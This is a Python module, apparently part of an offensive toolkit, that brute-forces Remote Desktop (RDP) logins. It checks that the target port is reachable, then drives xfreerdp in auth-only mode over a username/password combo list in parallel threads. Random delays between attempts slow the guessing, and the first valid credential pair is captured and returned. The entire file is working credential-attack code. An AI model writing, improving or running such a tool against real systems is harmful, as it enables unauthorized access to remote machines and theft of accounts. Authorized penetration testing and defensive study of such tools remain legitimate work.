# Author: FAZ-28 
# Description: module for brute force rdp
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import random
import socket
import logging

class BruteForceRDP:
    def __init__(self, target_ip, target_port=3389, combo_list=[], max_workers=5, max_errors=5):
        self.info = "RDP brute force module (using xfreerdp)"
        self.targetIP = target_ip
        self.targetPORT = target_port
        self.combos = combo_list
        self.max_workers = max_workers
        self.max_errors = max_errors
        self.lock = threading.Lock()
        self.found = False
        self.valid_cred = None
        self.error_count = 0

    def is_rdp_open(self):
        try:
            with socket.create_connection((self.targetIP, self.targetPORT), timeout=3):
                return True
        except:
            return False

    def attempt_login(self, username, password):
        if self.found or self.error_count >= self.max_errors:
            return None

        time.sleep(random.uniform(0.5, 1.5))  # jitter

        try:
            cmd = [
                "xfreerdp",
                f"/v:{self.targetIP}:{self.targetPORT}",
                f"/u:{username}",
                f"/p:{password}",
                "/cert:ignore",
                "/timeout:3000",
                "+auth-only"  # skip GUI, only check credentials
            ]

            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10, text=True)
            output = result.stdout.lower()

            if "authentication only, exit status 0" in output:
                with self.lock:
                    if not self.found:
                        self.found = True
                        self.valid_cred = (username, password)
                        logging.debug(f"Valid RDP credentials found: {username}:{password}")
                return (username, password)

        except Exception as e:
            with self.lock:
                self.error_count += 1
            logging.debug(f"Error attempting {username}:{password} - {str(e)}")
            return None

        return None

    def run(self):
        if not self.is_rdp_open():
            logging.warning("RDP port not open or target not reachable.")
            return None

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.attempt_login, u, p) for u, p in self.combos]

            for future in as_completed(futures):
                if self.found or self.error_count >= self.max_errors:
                    break

        return self.valid_cred if self.valid_cred else None
